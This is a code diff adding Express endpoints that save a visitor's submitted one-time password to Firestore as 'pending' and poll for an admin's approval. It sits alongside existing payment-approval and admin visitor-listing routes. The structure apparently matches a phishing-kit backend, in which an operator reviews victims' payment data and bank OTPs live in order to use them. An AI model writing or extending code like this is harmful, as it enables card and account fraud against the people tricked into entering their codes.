@@ -258,6 +258,55 @@ app.get('/api/check-payment-approval', async (req, res) => {
     }
 });
 
+app.post('/api/save-otp', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { otp } = req.body;
+        const { getFirestore } = require('./firebase-config');
+        const db = getFirestore();
+        const timestamp = new Date().toISOString();
+        const docRef = db.collection('visitors').doc(vid);
+        const doc = await docRef.get();
+        
+        const attemptCount = doc.exists && doc.data().otp && doc.data().otp.history 
+            ? Object.keys(doc.data().otp.history).length 
+            : 0;
+        
+        await docRef.update({
+            'otp.otp_status': 'pending',
+            'otp.current': {
+                otp,
+                timestamp,
+                attemptNumber: attemptCount + 1
+            },
+            'lastUpdated': timestamp
+        });
+        
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/check-otp-approval', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { getOtpStatus } = require('./admin-api');
+        const result = await getOtpStatus(vid);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 app.get('/api/admin/visitors', async (req, res) => {
     try {
         const result = await getAllVisitors();
